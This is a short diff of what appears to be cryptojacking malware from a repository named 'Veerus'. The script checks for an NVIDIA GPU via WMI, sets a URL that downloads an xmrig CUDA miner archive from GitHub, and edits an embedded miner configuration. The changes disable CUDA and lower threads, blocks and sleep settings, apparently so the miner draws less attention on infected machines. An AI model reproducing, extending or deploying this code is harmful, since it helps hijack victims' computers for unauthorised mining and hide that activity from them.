@@ -76,7 +76,7 @@ computer = wmi.WMI()
 GPUMODEL = computer.Win32_VideoController()[0]
 if("NVIDIA" in GPUMODEL.AdapterCompatibility):
 	MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrigcuda.zip?raw=true"
-	CUDA = True
+	CUDA = False
 
 
 
@@ -682,7 +682,7 @@ if yes == "yes":
     "colors": true,
     "cuda-bfactor": 12,
     "cuda-bsleep": 520,
-    "cuda-max-threads": 12,
+    "cuda-max-threads": 4,
     "donate-level": 5,
     "log-file": null,
     "pools": [
@@ -705,10 +705,10 @@ if yes == "yes":
     "threads": [
         {
             "index": 0,
-            "threads": 4,
-            "blocks": 64,
-            "bfactor": 6,
-            "bsleep": 25,
+            "threads": 2,
+            "blocks": 16,
+            "bfactor": 12,
+            "bsleep": 500,
             "sync_mode": 3,
             "affine_to_cpu": false
         }
